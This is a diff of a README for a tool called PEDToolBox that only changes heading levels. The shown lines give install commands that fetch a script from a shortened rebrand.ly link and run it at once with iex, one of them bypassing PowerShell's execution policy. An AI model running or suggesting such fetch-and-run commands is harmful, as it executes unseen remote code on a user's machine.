@@ -15,20 +15,20 @@
 
 - Please note that this tool is provided “as is” and should be used at your own risk. If you encounter any issues or have feedback, you can reach out to the developer at:
 ## pedtoolbox@gmail.com.
-- To run PEDToolBox, you can use the following commands:
 
+## To run PEDToolBox, you can use the following commands:
 
-## CMD or RUN Link  
+### CMD or RUN Link  
 
     powershell iex(irm rebrand.ly/pedbox)
-#### or
+##### or
 
     powershell irm rebrand.ly/pedbox | iex
 #### or
 
     cmd.exe /c powershell -command "Set-ExecutionPolicy Bypass -Scope Process -Force; iex(irm rebrand.ly/pedbox)"
 
-## PowerShell Link 
+### PowerShell Link 
 
     iex(irm rebrand.ly/pedbox)
 #### or
